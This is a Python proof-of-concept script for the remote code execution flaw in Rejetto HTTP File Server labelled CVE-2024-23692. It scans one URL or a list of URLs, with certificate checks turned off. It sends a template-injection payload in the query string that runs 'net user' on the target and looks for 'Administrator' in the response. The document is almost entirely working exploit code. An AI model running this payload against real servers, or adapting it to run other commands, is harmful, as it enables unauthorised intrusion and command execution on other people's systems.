#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import http.client
import argparse
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning
import ssl

RED = '\033[91m'
RESET = '\033[0m'

def check_vulnerability(url):
    try:
        # 忽略不安全的HTTPS请求警告
        ssl._create_default_https_context = ssl._create_unverified_context

        # 解析URL
        parsed_url = urlparse(url)
        host = parsed_url.netloc
        scheme = parsed_url.scheme
        path = parsed_url.path if parsed_url.path else '/'
        
        # 构造完整的攻击URL路径
        attack_path = path + "/?n=%0A&cmd=net%20user&search=%25xxx%25url:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}"

        # 根据URL的协议类型，选择合适的连接方式
        if scheme == "https":
            conn = http.client.HTTPSConnection(host, context=ssl._create_unverified_context())
        else:
            conn = http.client.HTTPConnection(host)

        # 发送请求
        conn.request("GET", attack_path)
        response = conn.getresponse()
        
        data = response.read().decode('utf-8')
        
        if response.status == 200 and 'Administrator' in data:
            print(f"{RED}URL [{url}] 存在Rejetto HTTP File Server远程代码执行漏洞（CVE-2024-23692）{RESET}")
        else:
            print(f"URL [{url}] 不存在漏洞")
        
        conn.close()
    except Exception as e:
        print(f"URL [{url}] 在检测过程中发生错误: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在Rejetto HTTP File Server远程代码执行漏洞（CVE-2024-23692）')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()